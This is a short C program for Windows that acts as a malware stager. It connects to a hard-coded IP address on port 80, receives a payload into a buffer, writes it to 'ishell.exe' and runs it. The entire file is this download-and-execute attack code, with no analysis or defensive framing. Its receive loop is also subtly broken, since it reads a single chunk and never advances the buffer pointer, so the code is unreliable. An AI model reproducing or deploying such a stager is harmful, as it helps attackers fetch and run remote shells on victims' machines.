#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#define IP_ADDRESS "10.230.229.13"
#define PORT 80
#define BUF_LEN 1024
#define PAYLOAD_SZ 819200

int main() {
  int timeout = 2000;
  
  // Initialize Winsock and use version 2.2
  WSADATA wsaData;
  int wResult;
  WSAStartup(MAKEWORD(2,2), &wsaData);
  
  // Create a socket to connect to an IP and port
  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char*) &timeout, sizeof(timeout));

  // Define socket type, AF_INET (IPv4), IP address, and port.
  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  // Connect to socket
  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );

  // Receive data from port;
  char buf[BUF_LEN] = "";
  char rwx[PAYLOAD_SZ] = "";
  char *index = rwx;    // Pointer to track position in the payload buffer.
  int res = 0;          // Hold return value of recv().
  u_long size = 0;      // Holds the size of the payload.
  int rcvd = 0;         // Track how many bytes we have received. Should match size when done.

  printf("Receiving\n");
  do {
    res = recv( ConnectSocket, index, BUF_LEN, 0 );
  } while (res == SOCKET_ERROR);

  closesocket(ConnectSocket);

  // Write data to a file.
  FILE *fout = fopen("ishell.exe", "wb");
  fwrite(rwx, 1, sizeof(rwx), fout);
  fclose(fout);
  
  // Execute the written file.
  system("ishell.exe");
 
  return 0; 
}
